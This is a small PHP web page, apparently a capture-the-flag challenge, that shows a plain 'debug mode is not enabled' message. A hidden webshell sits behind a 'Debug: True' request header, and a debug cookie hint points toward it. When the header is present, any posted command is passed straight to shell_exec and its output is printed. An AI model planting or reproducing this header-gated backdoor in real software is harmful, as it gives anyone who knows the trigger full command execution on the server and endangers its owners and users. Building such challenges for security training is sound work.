<!DOCTYPE html>
<html>
<head>
    <title>Simple PHP Webpage with Webshell</title>
    <script>
        function displayPopup(message) {
            alert(message);
        }
    </script>
</head>
<body>
    <?php
    // Check if the debug cookie is set and its value is "True" or "1"
    $cookieDebugMode = isset($_COOKIE['debug']) && ($_COOKIE['debug'] === 'True' || $_COOKIE['debug'] === '1');
    // Check if the debug cookie is set and display the popup message
    if ($cookieDebugMode) {
            echo "<script>displayPopup('Close! Try to get aHead');</script>";
    }


    // Check if the Debug header is set and its value is "True"
    $debugMode = isset($_SERVER['HTTP_DEBUG']) && $_SERVER['HTTP_DEBUG'] === 'True';

    if ($debugMode) {
        // Display the webshell interface if debug mode is enabled
        echo '<h1>Webshell</h1>';
        echo '<form method="POST">';
        echo '<label for="command">Enter a command:</label>';
        echo '<input type="text" name="command" id="command" required>';
        echo '<button type="submit">Execute</button>';
        echo '</form>';

        // Process the command submission
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $command = $_POST['command'];
            echo '<pre>';

            // Execute the command and display the output
            echo shell_exec($command);

            echo '</pre>';
        }

    } else {
        // Show a message indicating debug mode is not enabled
        echo '<h1>Simple PHP Webpage</h1>';
        echo '<p>Debug mode is not enabled.</p>';
    }
    ?>
</body>
</html>
